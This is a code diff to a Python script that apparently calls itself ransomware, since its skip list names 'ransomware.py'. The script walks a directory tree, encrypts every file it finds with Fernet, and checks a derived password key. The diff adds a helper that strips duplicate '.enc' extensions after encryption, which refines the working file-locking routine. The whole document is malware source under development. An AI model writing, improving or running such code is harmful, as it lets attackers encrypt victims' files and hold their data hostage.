@@ -30,12 +30,26 @@ def validate_password(input_password):
     """Check if the provided password is correct."""
     return derive_key(input_password) == key
 
+def simplify_enc_extensions(directory):
+    """
+    Ensures files only have a single `.enc` extension in the specified directory.
+    """
+    for root, _, files in os.walk(directory):
+        for file in files:
+            if file.endswith(".enc"):
+                filepath = os.path.join(root, file)
+                simplified_filepath = filepath
+                while simplified_filepath.endswith(".enc.enc"):
+                    simplified_filepath = simplified_filepath[:-4]
+                if simplified_filepath != filepath:
+                    os.rename(filepath, simplified_filepath)
+                    print(f"Renamed: {filepath} -> {simplified_filepath}")
+
 def encrypt_directory(directory, key, chunk_size=1024 * 1024):
     try:
         f = Fernet(key)
         for root, _, files in os.walk(directory):
             for file in files:
-                # Skip specific files and already encrypted files
                 if file.lower() in ["desktop.ini", "ransomware.py"] or file.endswith(".enc"):
                     print(f"Skipping: {file}")
                     continue
@@ -54,6 +68,7 @@ def encrypt_directory(directory, key, chunk_size=1024 * 1024):
                 except Exception as e:
                     print(f"Failed to encrypt {filepath}: {e}")
 
+        simplify_enc_extensions(directory)
         messagebox.showinfo("Success", "All files encrypted successfully!")
     except Exception as e:
         messagebox.showerror("Error", f"Encryption failed: {e}")
